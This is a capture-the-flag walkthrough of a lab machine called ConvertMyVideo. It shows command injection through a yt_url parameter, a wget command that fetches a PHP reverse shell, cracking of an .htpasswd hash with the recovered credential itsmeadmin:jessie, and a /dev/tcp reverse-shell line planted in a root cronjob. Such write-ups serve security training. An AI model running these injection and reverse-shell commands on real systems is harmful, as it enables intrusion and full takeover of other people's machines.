ConvertMyVideo

Target IP: 10.10.28.142

Scanning


There are only two TCP ports open on the target machine: SSH and HTTP.

Enumeration

Port 80: HTTP


Browsing to this application displays the webpage above. Since this application uses JavaScript, the script is included for me to view it!


The Javascript main.js contains the code above. There is an interesting parameter called yt_url.


Inputting a random video ID of asdasd;ls shows the output above inside the console. I wonder if it is possible to perform command injection using the parameter yt_url from above. Copying and pasting parts of this error message on Google links to a Github project called youtube-dl.


And it looks like target machine is vulnerable to command injection. I tried a few payload but the backticks work.

Exploitation


I created a PHP Pentest Monkey reverse shell inside a file called shell.php and then started a Python HTTP server on port 80. Using Bursuite, I made the target machine download the shell.php on their machine using the command wget${IFS}http://10.14.55.153/shell.php. The ${IFS} is used for the space. After, I started a listener on port 8443 and visited http://10.10.28.142/shell.php to obtain a reverse shell connection. Now I have a foothold on the target machine.

Privilege Escalation


There is a password file called .htpasswd with the username itsmeadmin with the password hash of $apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/.


I copied the password hash to a file called hash and ran john on it. I obtained the password jessie. I now have the credential itsmeadmin:jessie.


And now I have access to the password-protected page using the credential above.


Pressing the button Clean Downloads clears the contents at /tmp/downloads.



I found the script for the Clean Downloads functionality. It is a cronjob executed by the root! Time to put the reverse shell inside this script. I have full privileges over this file.


I put /bin/bash -i >& /dev/tcp/10.14.55.153/8444 0>&1 inside clean.sh and changed the permission of this file to be executable. And then I started a listener on port 8444 and gained a root reverse-shell connection! GG.
